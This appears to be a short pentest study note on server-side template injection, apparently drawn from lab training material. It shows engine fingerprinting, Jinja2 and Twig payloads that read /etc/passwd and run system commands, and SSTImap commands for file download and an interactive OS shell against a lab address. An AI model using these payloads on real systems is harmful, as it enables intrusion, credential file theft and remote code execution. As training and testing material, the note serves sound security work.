# SSTI

```
${{<%[%'"}}%\.
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FRp99vkb4LFXqmt6kxyE9%2Fimage.png?alt=media&amp;token=b21e89b0-213d-47ba-bd04-bca7551f5d87" alt=""><figcaption></figcaption></figure>

### Identifying the Template Engine

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FTOmz8gV28nLJgoKeewif%2Fimage.png?alt=media&amp;token=33cfeae0-e141-477e-9261-227e779a66a0" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FvIRhHVtvGOL8Bm5zBydy%2Fimage.png?alt=media&amp;token=2199b04e-9ebb-46f6-af08-b1b5778029ef" alt=""><figcaption></figcaption></figure>

{{7\*7}}

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FXvBVLVCe9K9AKWnaOfb3%2Fimage.png?alt=media&amp;token=1e8b8c25-2320-43bf-8e62-6e2acf81b3b4" alt=""><figcaption></figcaption></figure>

This time, the payload was executed by the template engine. Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`. The result will enable us to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`.

## 2.Exploiting SSTI - Jinja2

```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```

### Local File Inclusion (LFI)

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Remote Code Execution (RCE)

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## 3.Exploiting SSTI - Twig

Info disclose LFI RCE all three payloads.

```twig
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md>" %}

### Tools of the Trade

The most popular tool for identifying and exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap). However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process. We can run it after cloning the repository and installing the required dependencies:

<pre class="language-powershell"><code class="lang-powershell">Olanzapine@htb[/htb]$ git clone https://github.com/vladko312/SSTImap

Olanzapine@htb[/htb]$ cd SSTImap

Olanzapine@htb[/htb]$ pip3 install -r requirements.txt

Olanzapine@htb[/htb]$ python3 sstimap.py


<strong>## identify
</strong>python3 sstimap.py -u http://172.17.0.2/index.php?name=test


### Twig engine template
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'


### execute a system command
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

### interactive shell:
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
</code></pre>
